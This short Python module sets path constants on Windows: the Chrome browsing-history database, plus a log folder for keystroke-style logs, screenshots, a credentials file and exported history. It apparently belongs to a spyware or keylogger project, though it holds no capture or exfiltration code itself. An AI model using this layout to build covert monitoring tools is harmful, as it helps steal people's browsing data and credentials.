#!/usr/bin/python
import os

"""This module for all the program paths
    """

base_path = os.path.join(os.path.expandvars("%userprofile%"))
history_db = base_path + '\AppData\Local\Google\Chrome\User Data\Default\History'
folder_path = base_path + '\\Logs'
logs_file = folder_path + '\\logs.txt'
screen_shots = folder_path + '\\Screenshots'
creds = folder_path + '\\creds.txt'
browser_file =  folder_path + '\\history.txt'
